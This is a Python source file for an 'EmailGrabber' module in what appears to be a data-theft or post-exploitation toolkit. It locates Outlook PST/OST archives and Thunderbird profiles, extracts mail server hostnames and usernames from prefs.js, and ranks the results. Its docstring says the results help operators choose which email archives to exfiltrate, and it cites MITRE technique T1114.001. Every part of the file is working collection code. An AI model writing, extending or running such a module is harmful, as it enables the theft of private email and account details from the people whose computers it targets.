"""
EmailGrabber — Discover and catalog email data stores

Targets:
- Outlook: .pst/.ost files (size, path, modified date for triage)
- Thunderbird: profiles with stored accounts
- .eml/.msg files in common locations

Note: This module discovers and catalogs email stores rather than parsing
their binary formats (which would require external libraries). The findings
help operators prioritize which email archives to exfiltrate.

MITRE ATT&CK: T1114.001 (Email Collection: Local Email Collection)
"""

from __future__ import annotations

import json
import os

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class EmailGrabber(GrabberModule):
    name = "email"
    description = "Discover Outlook PST/OST files and Thunderbird profiles"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _OUTLOOK_PATHS = [
        "{localappdata}/Microsoft/Outlook",
        "{home}/Documents/Outlook Files",
    ]

    _THUNDERBIRD_PATHS = [
        "{appdata}/Thunderbird/Profiles",
        "{home}/.thunderbird",
        "{home}/Library/Thunderbird/Profiles",
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template in self._OUTLOOK_PATHS + self._THUNDERBIRD_PATHS:
            path = self._expand(template, context)
            if path and os.path.isdir(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Outlook PST/OST discovery
        for template in self._OUTLOOK_PATHS:
            path = self._expand(template, context)
            if not path or not os.path.isdir(path):
                continue

            pst_files = self._find_email_files(path)
            for file_info in pst_files:
                result.credentials.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="token",  # metadata rather than actual cred
                    target_application="Outlook",
                    url=file_info["path"],
                    notes=f"size={file_info['size_mb']:.1f}MB modified={file_info['modified']}",
                    mitre_technique="T1114.001",
                ))

            if pst_files:
                total_size = sum(f["size_mb"] for f in pst_files)
                result.findings.append(self.make_finding(
                    file_path=path,
                    description=f"Found {len(pst_files)} Outlook archive(s) ({total_size:.0f}MB total)",
                    score=60 * min(len(pst_files), 3),
                    matched_value="Outlook",
                    snippets=[f"{f['name']} ({f['size_mb']:.0f}MB)" for f in pst_files[:5]],
                ))

        # Thunderbird profile discovery
        for template in self._THUNDERBIRD_PATHS:
            path = self._expand(template, context)
            if not path or not os.path.isdir(path):
                continue

            accounts = self._find_thunderbird_accounts(path)
            result.credentials.extend(accounts)

            if accounts:
                result.findings.append(self.make_finding(
                    file_path=path,
                    description=f"Found {len(accounts)} Thunderbird email account(s)",
                    score=50 * min(len(accounts), 3),
                    matched_value="Thunderbird",
                ))

        result.status = GrabberStatus.COMPLETED
        return result

    def _expand(self, template: str, context: GrabberContext) -> str:
        return template.format(
            localappdata=context.appdata_local or "",
            appdata=context.appdata_roaming or "",
            home=context.user_profile_path,
        )

    @staticmethod
    def _find_email_files(directory: str) -> list[dict]:
        """Find .pst and .ost files with metadata."""
        results = []
        try:
            for entry in os.scandir(directory):
                if entry.is_file() and entry.name.lower().endswith((".pst", ".ost")):
                    stat = entry.stat()
                    results.append({
                        "path": entry.path,
                        "name": entry.name,
                        "size_mb": stat.st_size / (1024 * 1024),
                        "modified": str(stat.st_mtime),
                    })
        except (PermissionError, OSError):
            pass
        return results

    @staticmethod
    def _find_thunderbird_accounts(profiles_dir: str) -> list[ExtractedCredential]:
        """Extract account info from Thunderbird profiles."""
        creds = []
        try:
            for profile_name in os.listdir(profiles_dir):
                profile_path = os.path.join(profiles_dir, profile_name)
                prefs_path = os.path.join(profile_path, "prefs.js")

                content = safe_read_text(prefs_path)
                if not content:
                    continue

                # Extract email server hostnames from prefs.js
                import re
                servers = re.findall(
                    r'user_pref\("mail\.server\.server\d+\.hostname",\s*"([^"]+)"\)',
                    content,
                )
                users = re.findall(
                    r'user_pref\("mail\.server\.server\d+\.userName",\s*"([^"]+)"\)',
                    content,
                )

                for i, server in enumerate(servers):
                    username = users[i] if i < len(users) else ""
                    creds.append(ExtractedCredential(
                        source_module="email",
                        credential_type="token",
                        target_application="Thunderbird",
                        url=server,
                        username=username,
                        notes=f"profile={profile_name}",
                        mitre_technique="T1114.001",
                    ))
        except (OSError, IndexError):
            pass
        return creds
